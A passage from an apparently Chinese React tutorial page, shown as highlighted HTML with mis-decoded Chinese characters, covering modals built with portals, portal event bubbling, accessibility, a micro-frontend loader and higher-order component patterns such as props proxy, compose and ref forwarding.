handleKeyDown);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">&#x27;keydown&#x27;</span>, handleKeyDown);<br>    &#125;;<br>  &#125;, [isOpen, onClose]);<br>  <br>  <span class="hljs-keyword">if</span> (!isOpen) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createPortal</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> </span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;dialog&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">aria-modal</span>=<span class="hljs-string">&quot;true&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">aria-labelledby</span>=<span class="hljs-string">&quot;modal-title&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;modalRef&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">      <span class="hljs-attr">tabIndex</span>=<span class="hljs-string">&#123;-1&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;modal-content&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;modal-title&quot;</span>&gt;</span>&#123;title&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;children&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;onClose&#125;</span> <span class="hljs-attr">aria-label</span>=<span class="hljs-string">&quot;å…³é—­å¯¹è¯æ¡†&quot;</span>&gt;</span></span><br><span class="language-xml">          å…³é—­</span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>,<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;modal-root&#x27;</span>)<br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¼ä¸šçº§æœ€ä½³å®è·µ-1"><a href="#ä¼ä¸šçº§æœ€ä½³å®è·µ-1" class="headerlink" title="ä¼ä¸šçº§æœ€ä½³å®è·µ"></a>ä¼ä¸šçº§æœ€ä½³å®è·µ</h3><p><strong>å¾®å‰ç«¯é›†æˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">MicroFrontendPortal</span>(<span class="hljs-params">&#123; appName, componentName &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [<span class="hljs-title class_">Component</span>, setComponent] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-comment">// åŠ¨æ€åŠ è½½è¿œç¨‹æ¨¡å—</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">loadRemoteComponent</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> remoteModule = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">window</span>[appName].<span class="hljs-title function_">get</span>(componentName);<br>        <span class="hljs-title function_">setComponent</span>(<span class="hljs-function">() =&gt;</span> remoteModule);<br>      &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`åŠ è½½ <span class="hljs-subst">$&#123;appName&#125;</span>/<span class="hljs-subst">$&#123;componentName&#125;</span> å¤±è´¥:`</span>, error);<br>      &#125;<br>    &#125;;<br>    <br>    <span class="hljs-title function_">loadRemoteComponent</span>();<br>  &#125;, [appName, componentName]);<br>  <br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Component</span>) <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SmartPortal</span> <span class="hljs-attr">containerId</span>=<span class="hljs-string">&#123;</span>`$&#123;<span class="hljs-attr">appName</span>&#125;<span class="hljs-attr">-portal</span>`&#125;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Component</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">SmartPortal</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span><br>&lt;<span class="hljs-title class_">MicroFrontendPortal</span> <br>  appName=<span class="hljs-string">&quot;billingApp&quot;</span> <br>  componentName=<span class="hljs-string">&quot;PaymentWidget&quot;</span> <br>/&gt;<br></code></pre></td></tr></table></figure><h3 id="é¢è¯•é«˜é¢‘é—®é¢˜è§£æ-1"><a href="#é¢è¯•é«˜é¢‘é—®é¢˜è§£æ-1" class="headerlink" title="é¢è¯•é«˜é¢‘é—®é¢˜è§£æ"></a>é¢è¯•é«˜é¢‘é—®é¢˜è§£æ</h3><p><strong>Qï¼šPortals å’Œæ™®é€šæ¸²æŸ“æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">æ™®é€šæ¸²æŸ“</th><th align="left">Portal</th></tr></thead><tbody><tr><td align="left">DOM ä½ç½®</td><td align="left">çˆ¶ç»„ä»¶å†…</td><td align="left">ä»»æ„ DOM èŠ‚ç‚¹</td></tr><tr><td align="left">äº‹ä»¶å†’æ³¡</td><td align="left">éµå¾ª DOM ç»“æ„</td><td align="left">éµå¾ª React æ ‘ç»“æ„</td></tr><tr><td align="left">ä¸Šä¸‹æ–‡è®¿é—®</td><td align="left">æ­£å¸¸è®¿é—®</td><td align="left">æ­£å¸¸è®¿é—®</td></tr><tr><td align="left">æ ·å¼ç»§æ‰¿</td><td align="left">å—çˆ¶å®¹å™¨å½±å“</td><td align="left">å¯é¿å…çˆ¶å®¹å™¨å½±å“</td></tr><tr><td align="left">åº”ç”¨åœºæ™¯</td><td align="left">å¸¸è§„ UI</td><td align="left">æ¨¡æ€æ¡†ã€é€šçŸ¥ç­‰</td></tr></tbody></table><p><strong>Qï¼šä¸ºä»€ä¹ˆ Portal çš„äº‹ä»¶å†’æ³¡åˆ° React çˆ¶ç»„ä»¶ï¼Ÿ</strong></p><ul><li>Portal çš„ç‰¹æ®Šä¹‹å¤„åœ¨äºå®ƒåœ¨ DOM æ ‘ä¸­çš„ä½ç½®æ˜¯ç‹¬ç«‹çš„</li><li>ä½† React çš„äº‹ä»¶ç³»ç»Ÿæ˜¯åˆæˆçš„ï¼Œä¸ä¾èµ–å®é™… DOM ç»“æ„</li><li>äº‹ä»¶å†’æ³¡åŸºäº React ç»„ä»¶æ ‘ç»“æ„ï¼Œè€Œéå®é™… DOM ç»“æ„</li><li>å› æ­¤ Portal ä¸­çš„äº‹ä»¶ä¼šå†’æ³¡åˆ° React æ ‘ä¸­çš„çˆ¶ç»„ä»¶</li></ul><p><strong>Qï¼šå¦‚ä½•é˜»æ­¢ Portal çš„äº‹ä»¶å†’æ³¡ï¼Ÿ</strong></p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">PortalWithStopPropagation</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handlePortalClick</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    e.<span class="hljs-title function_">stopPropagation</span>(); <span class="hljs-comment">// é˜»æ­¢äº‹ä»¶å†’æ³¡</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Portal ç‚¹å‡»&#x27;</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">createPortal</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handlePortalClick&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>ç‚¹å‡»æˆ‘<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>,<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;portal-root&#x27;</span>)<br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Qï¼šPortals å¯¹æ— éšœç¢æœ‰ä»€ä¹ˆå½±å“ï¼Ÿ</strong></p><p>æœ€ä½³å®è·µï¼š</p><ul><li>ç„¦ç‚¹ç®¡ç†ï¼šæ‰“å¼€ Portal æ—¶ç§»åŠ¨ç„¦ç‚¹åˆ°å†…å®¹ï¼Œå…³é—­æ—¶è¿”å›ç„¦ç‚¹</li><li>ARIA å±æ€§ï¼šä½¿ç”¨ role&#x3D;â€dialogâ€ å’Œ aria-modal&#x3D;â€trueâ€</li><li>é”®ç›˜å¯¼èˆªï¼šå®ç° ESC å…³é—­å’Œ Tab é”®é™·é˜±</li><li>å±å¹•é˜…è¯»å™¨ï¼šä½¿ç”¨ aria-labelledby å…³è”æ ‡é¢˜</li><li>èƒŒæ™¯é®è”½ï¼šæ·»åŠ  aria-hidden&#x3D;â€trueâ€ åˆ°èƒŒæ™¯å†…å®¹</li></ul><h3 id="æ€»ç»“-2"><a href="#æ€»ç»“-2" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><ul><li>æ ¸å¿ƒä»·å€¼ï¼š<ul><li>çªç ´ CSS å±‚çº§é™åˆ¶ï¼ˆoverflow, z-index, transformï¼‰</li><li>ä¿æŒ React ä¸Šä¸‹æ–‡å’Œäº‹ä»¶ç³»ç»Ÿ</li><li>å®ç°å…¨å±€ UI å…ƒç´ ï¼ˆæ¨¡æ€æ¡†ã€é€šçŸ¥ã€å·¥å…·æç¤ºï¼‰</li></ul></li><li>å…³é”®æŠ€æœ¯ï¼š<ul><li>ReactDOM.createPortal() API</li><li>åŠ¨æ€å®¹å™¨ç®¡ç†</li><li>äº‹ä»¶å†’æ³¡å¤„ç†</li><li>æ— éšœç¢æ”¯æŒ</li></ul></li><li>æœ€ä½³å®è·µï¼š<ul><li>æ¨¡æ€æ¡†å®ç°ï¼ˆåŒ…å«ç„¦ç‚¹ç®¡ç†ï¼‰</li><li>å…¨å±€é€šçŸ¥ç³»ç»Ÿ</li><li>æœåŠ¡ç«¯æ¸²æŸ“å…¼å®¹</li><li>å¾®å‰ç«¯é›†æˆ</li></ul></li><li>React 18 å¢å¼ºï¼š<ul><li>æ–°çš„ Root API æ”¯æŒ</li><li>å¹¶å‘æ¸²æŸ“å…¼å®¹</li><li>æ›´ç²¾ç»†çš„æ§åˆ¶èƒ½åŠ›</li></ul></li><li>ä¼ä¸šçº§åº”ç”¨ï¼š<ul><li>å®‰å…¨æ²™ç®±æ¨¡å¼</li><li>æ€§èƒ½ä¼˜åŒ–ç­–ç•¥</li><li>è°ƒè¯•ä¸ç›‘æ§</li></ul></li><li>é¢è¯•é‡ç‚¹ï¼š<ul><li>Portals ä¸æ™®é€šæ¸²æŸ“çš„åŒºåˆ«</li><li>äº‹ä»¶å†’æ³¡æœºåˆ¶</li><li>æ— éšœç¢å®ç°</li><li>æœåŠ¡ç«¯æ¸²æŸ“å¤„ç†</li></ul></li></ul><h2 id="4-5-é«˜é˜¶ç»„ä»¶ï¼ˆHOCï¼‰ä¸-Render-Props"><a href="#4-5-é«˜é˜¶ç»„ä»¶ï¼ˆHOCï¼‰ä¸-Render-Props" class="headerlink" title="4.5 é«˜é˜¶ç»„ä»¶ï¼ˆHOCï¼‰ä¸ Render Props"></a>4.5 é«˜é˜¶ç»„ä»¶ï¼ˆHOCï¼‰ä¸ Render Props</h2><h3 id="ç»„ä»¶å¤ç”¨çš„æ ¸å¿ƒæŒ‘æˆ˜"><a href="#ç»„ä»¶å¤ç”¨çš„æ ¸å¿ƒæŒ‘æˆ˜" class="headerlink" title="ç»„ä»¶å¤ç”¨çš„æ ¸å¿ƒæŒ‘æˆ˜"></a>ç»„ä»¶å¤ç”¨çš„æ ¸å¿ƒæŒ‘æˆ˜</h3><p><strong>ä¼ ç»Ÿç»„ä»¶å¤ç”¨çš„é—®é¢˜</strong></p><pre class="mermaid">graph TD    A[ç»„ä»¶å¤ç”¨éœ€æ±‚] --> B[ç›´æ¥ç»§æ‰¿]    A --> C[ç»„åˆæ¨¡å¼]    B --> D[ç´§è€¦åˆ]    B --> E[çµæ´»æ€§å·®]    C --> F[å¤šå±‚åµŒå¥—]    C --> G[props é€ä¼ é—®é¢˜]</pre><p><strong>è§£å†³æ–¹æ¡ˆå¯¹æ¯”</strong></p><table><thead><tr><th align="left">æ¨¡å¼</th><th align="left">æ ¸å¿ƒæ€æƒ³</th><th align="left">é€‚ç”¨åœºæ™¯</th><th align="left">ä¼˜ç‚¹</th><th align="left">ç¼ºç‚¹</th></tr></thead><tbody><tr><td align="left">é«˜é˜¶ç»„ä»¶ (HOC)</td><td align="left">å‡½æ•°æ¥å—ç»„ä»¶è¿”å›æ–°ç»„ä»¶</td><td align="left">æ¨ªåˆ‡å…³æ³¨ç‚¹</td><td align="left">é€»è¾‘å¤ç”¨å¼º</td><td align="left">åµŒå¥—è¿‡æ·±</td></tr><tr><td align="left">Render Props</td><td align="left">ç»„ä»¶é€šè¿‡ prop æ¸²æŸ“å†…å®¹</td><td align="left">åŠ¨æ€ç»„åˆ</td><td align="left">çµæ´»ç›´è§‚</td><td align="left">å›è°ƒåœ°ç‹±</td></tr><tr><td align="left">è‡ªå®šä¹‰ Hooks</td><td align="left">å‡½æ•°å°è£…å¯å¤ç”¨é€»è¾‘</td><td align="left">åŠŸèƒ½å¤ç”¨</td><td align="left">ç®€æ´é«˜æ•ˆ</td><td align="left">ä»…å‡½æ•°ç»„ä»¶</td></tr></tbody></table><h3 id="é«˜é˜¶ç»„ä»¶ï¼ˆHOCï¼‰æ·±åº¦è§£æ"><a href="#é«˜é˜¶ç»„ä»¶ï¼ˆHOCï¼‰æ·±åº¦è§£æ" class="headerlink" title="é«˜é˜¶ç»„ä»¶ï¼ˆHOCï¼‰æ·±åº¦è§£æ"></a>é«˜é˜¶ç»„ä»¶ï¼ˆHOCï¼‰æ·±åº¦è§£æ</h3><p><strong>HOC æ ¸å¿ƒæ¦‚å¿µ</strong></p><p>å®šä¹‰ï¼šé«˜é˜¶ç»„ä»¶æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªç»„ä»¶å¹¶è¿”å›ä¸€ä¸ªæ–°çš„å¢å¼ºç»„ä»¶ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">EnhancedComponent</span> = <span class="hljs-title function_">withEnhancement</span>(<span class="hljs-title class_">WrappedComponent</span>);<br></code></pre></td></tr></table></figure><p><strong>HOC å®ç°æ¨¡å¼</strong></p><p>(1) å±æ€§ä»£ç†ï¼ˆProps Proxyï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withDataFetching</span>(<span class="hljs-params">WrappedComponent, fetchUrl</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">extends</span> <span class="hljs-title class_">React</span>.<span class="hljs-property">Component</span> &#123;<br>    state = &#123; <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;;<br>    <br>    <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-title function_">fetch</span>(fetchUrl)<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())<br>        .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; data, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span> &#125;))<br>        .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123; error, <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span> &#125;));<br>    &#125;<br>    <br>    <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">const</span> &#123; data, loading, error &#125; = <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>;<br>      <br>      <span class="hljs-comment">// æ³¨å…¥é¢å¤– props</span><br>      <span class="hljs-keyword">return</span> (<br>        <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> </span></span><br><span class="hljs-tag"><span class="language-xml">          &#123;<span class="hljs-attr">...this.props</span>&#125; </span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">data</span>=<span class="hljs-string">&#123;data&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">loading</span>=<span class="hljs-string">&#123;loading&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">error</span>=<span class="hljs-string">&#123;error&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">        /&gt;</span></span><br>      );<br>    &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">UserProfileWithData</span> = <span class="hljs-title function_">withDataFetching</span>(<span class="hljs-title class_">UserProfile</span>, <span class="hljs-string">&#x27;/api/user/123&#x27;</span>);<br></code></pre></td></tr></table></figure><p>(2) åå‘ç»§æ‰¿ï¼ˆInheritance Inversionï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withLogging</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">extends</span> <span class="hljs-title class_">WrappedComponent</span> &#123;<br>    <span class="hljs-title function_">componentDidMount</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Component mounted:&#x27;</span>, <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">name</span>);<br>      <span class="hljs-variable language_">super</span>.<span class="hljs-property">componentDidMount</span>?.();<br>    &#125;<br>    <br>    <span class="hljs-title function_">componentWillUnmount</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Component unmounted:&#x27;</span>, <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">name</span>);<br>      <span class="hljs-variable language_">super</span>.<span class="hljs-property">componentWillUnmount</span>?.();<br>    &#125;<br>    <br>    <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-comment">// å¯æ“ä½œæ¸²æŸ“è¾“å‡º</span><br>      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">hidden</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>      &#125;<br>      <br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">render</span>();<br>    &#125;<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">EnhancedComponent</span> = <span class="hljs-title function_">withLogging</span>(<span class="hljs-title class_">MyComponent</span>);<br></code></pre></td></tr></table></figure><p><strong>HOC é“¾å¼ç»„åˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç»„åˆå¤šä¸ª HOC</span><br><span class="hljs-keyword">const</span> enhance = <span class="hljs-title function_">compose</span>(<br>  withRouter,<br>  <span class="hljs-title function_">withStyles</span>(styles),<br>  <span class="hljs-title function_">withDataFetching</span>(<span class="hljs-string">&#x27;/api/data&#x27;</span>),<br>  withErrorBoundary<br>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">SuperComponent</span> = <span class="hljs-title function_">enhance</span>(<span class="hljs-title class_">BaseComponent</span>);<br><br><span class="hljs-comment">// è‡ªå®šä¹‰ compose å‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">compose</span>(<span class="hljs-params">...hocs</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-params">Component</span> =&gt;</span> <br>    hocs.<span class="hljs-title function_">reduceRight</span>(<span class="hljs-function">(<span class="hljs-params">acc, hoc</span>) =&gt;</span> <span class="hljs-title function_">hoc</span>(acc), <span class="hljs-title class_">Component</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>HOC æœ€ä½³å®è·µ</strong></p><p>(1) æ˜¾ç¤ºåç§°è®¾ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withDisplayName</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">WithDisplayName</span> = props =&gt; <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">WrappedComponent</span> &#123;<span class="hljs-attr">...props</span>&#125; /&gt;</span></span>;<br>  <br>  <span class="hljs-comment">// è®¾ç½® displayName ä¾¿äºè°ƒè¯•</span><br>  <span class="hljs-keyword">const</span> displayName = <br>    <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">displayName</span> || <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">name</span> || <span class="hljs-string">&#x27;Component&#x27;</span>;<br>  <br>  <span class="hljs-title class_">WithDisplayName</span>.<span class="hljs-property">displayName</span> = <span class="hljs-string">`WithDisplayName(<span class="hljs-subst">$&#123;displayName&#125;</span>)`</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">WithDisplayName</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) é™æ€æ–¹æ³•å¤åˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">copyStaticMethods</span>(<span class="hljs-params">WrappedComponent, EnhancedComponent</span>) &#123;<br>  <span class="hljs-comment">// å¤åˆ¶é™æ€æ–¹æ³•</span><br>  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(<span class="hljs-title class_">WrappedComponent</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">WrappedComponent</span>[key] === <span class="hljs-string">&#x27;function&#x27;</span>) &#123;<br>      <span class="hljs-title class_">EnhancedComponent</span>[key] = <span class="hljs-title class_">WrappedComponent</span>[key];<br>    &#125;<br>  &#125;);<br>  <br>  <span class="hljs-comment">// å¤åˆ¶é™æ€å±æ€§</span><br>  <span class="hljs-title class_">EnhancedComponent</span>.<span class="hljs-property">staticProperty</span> = <span class="hljs-title class_">WrappedComponent</span>.<span class="hljs-property">staticProperty</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">EnhancedComponent</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>(3) Refs è½¬å‘</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">withRefForwarding</span>(<span class="hljs-params">WrappedComponent</span>) &#123;<br>  <span class="hljs-keyword">class</span> <span class="hljs-title class_">WithRefForwarding</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>    <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">const</span> &#123; forwardedRef, ...rest &#125; = <span class="hljs-variable 